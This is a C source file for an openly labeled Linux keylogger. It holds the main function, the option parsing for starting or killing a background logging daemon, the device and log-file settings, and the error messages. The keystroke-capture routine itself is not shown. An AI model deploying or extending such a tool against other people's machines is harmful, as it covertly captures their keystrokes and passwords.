/*
  linux keyloggger
  @author Liu Mohan
*/
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include "keylogger.h"


int main(int argc, char ** argv){
  arguments args;
  args = parse_args(argc, argv);
  INFO("operation: %d\n", args.operation);
  if(args.arg_log!=NULL){
    INFO("log: %s\n", args.arg_log);
  }
  if(args.arg_dev!=NULL){
    INFO("dev: %s\n", args.arg_dev);
  }
  INFO("daemon: %d\n", args.arg_daemon_flag);
  switch(args.operation){
    case START:
      start_logging(args);
      break;

    case KILL:
      kill_daemon();
      break;

    case HELP:
    default:
      print_usage(stdout);
      break;
  }
  return 0;
}

char* usage =
  "<help>\n"
  "usage: keyloggger -s | -k | -h [-o log][-d device][-n]\n"
  "!need root privilege.\n\n"
  "option         argument    description\n"
  "-s/--start     (no)        start keyloggger\n"
  "-k/--kill      (no)        kill keyloggger\n"
  "-h/--help      (no)        get help information\n"
  "-o/--output    log path    specify log file (default: ./key.log)\n"
  "-d/--device    eventX path specify event to monitor\n"
  "                           (will detect eventX automatically if not specified)\n"
  "-n/--no-daemon (no)        no daemon\n";

char * error_info[] = {
/* 1*/ "Lack of necessary option",
/* 2*/ "Option conflict",
/* 3*/ "Unknown option",
/* 4*/ "Missing argument",
/* 5*/ "Start: daemon alreagy running",
/* 6*/ "Kill: daemon not running",
/* 7*/ "Output: unable to open log file",
/* 8*/ "Device: unable to open event",
/* 9*/ "Device: Option missing",
/*10*/ "Start: Fail",
/*11*/ "Kill: Fail"
};

inline void print_usage(FILE* __stream){
  fprintf(__stream, usage);
}

void handle_error(FILE* __stream, unsigned short error_id){
  if(error_id > 0){
    fprintf(__stream, "ERROR: %s\n", error_info[error_id - 1]);
  }
  print_usage(__stream);
  exit(EXIT_FAILURE);
}
